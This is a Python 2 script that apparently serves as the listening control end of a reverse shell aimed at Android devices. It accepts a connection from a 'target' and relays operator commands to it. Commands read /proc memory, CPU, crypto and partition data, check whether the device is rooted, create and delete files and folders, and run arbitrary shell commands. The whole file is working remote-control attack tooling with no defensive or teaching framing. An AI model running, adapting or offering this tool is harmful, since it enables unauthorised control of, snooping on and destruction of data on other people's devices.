import os
import sys
from time import sleep

r="\033[0;31m"
g="\033[0;32m"
p="\033[0;35m"
y="\033[1;33m"
w="\033[0m"

host = sys.argv[1]
port = int(sys.argv[2])

import socket
import sys
from time import sleep

print(p+"listening by the port: "+w+str(port)+w)
sleep(1)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(5)
print(p+"waiting for connection..."+w)
c, _ = s.accept()
print(p+'sessions opened '+p + p+'host: '+w + _[0] + p+' port: '+w + str(_[1])+'\n')
sleep(2)
def main():
 while True:
     hosttt = _[0]
     cmd = raw_input(p+hosttt+'$ '+w)
     if cmd[0:5] == 'mkdir':
      c.send(cmd+' && pwd\n')
      c.recv(1024)
					
     elif cmd == 'meminfo':
      c.send('cat /proc/meminfo')
      print c.recv(1024)

     elif cmd == 'cpuinfo':
      c.send('cat /proc/cpuinfo')
      print c.recv(1024)

     elif cmd == 'crypto':
      c.send('cat /proc/crypto')
      print c.recv(10000)

     elif cmd == 'kernel_info':
      c.send(cmd)
      ab = c.recv(1024)
      print(p+"kernel version: "+w+ab)

     elif cmd == 'check_root':
      c.send('which su')
      a = c.recv(1024)
      if a == '\n/system/bin/su\n':
       print(g+"this device is rooted !"+w)
      else:
       print(r+"this device not rooted !"+w)

     elif cmd == 'su':
      print(r+"command 'SU' not working !"+w)
      main()

     elif cmd == 'check_partitions':
      c.send('cat /proc/partitions')
      print ''
      print c.recv(100000)

     elif cmd == 'help':
      print(p+"""
kernel_info      cek kernel version + info
mkdir            create directory on target
meminfo          check info memory target
cpuinfo          check info CPU target
rm               remove file on target
rmdir            remove folder on target
whoami           check name user target
crypto           check encoding on target
check_partitions check info partisi on target
"""+w)

     elif cmd[0:2] == 'rm':
      c.send(cmd+' && pwd\n')
      c.recv(1024)
					
     elif cmd[0:5] == 'rmdir':
      c.send(cmd+' && pwd\n')
      c.recv(1024)
				
     elif cmd[0:6] == 'whoami':
      c.send('whoami')
      print c.recv(1024)

     elif cmd == '':
      main()

     else:

      c.send(cmd)
      results = c.recv(4096)
      if results == 'bacod':
       main()
      print results

try:
    main()
except KeyboardInterrupt:
    print(r+"CTRL+C detect shutdown server !"+w)
    sleep(2)
    sys.exit()
except socket.error:
    print(r+"client clossed !"+w)
    sleep(2)
    sys.exit()
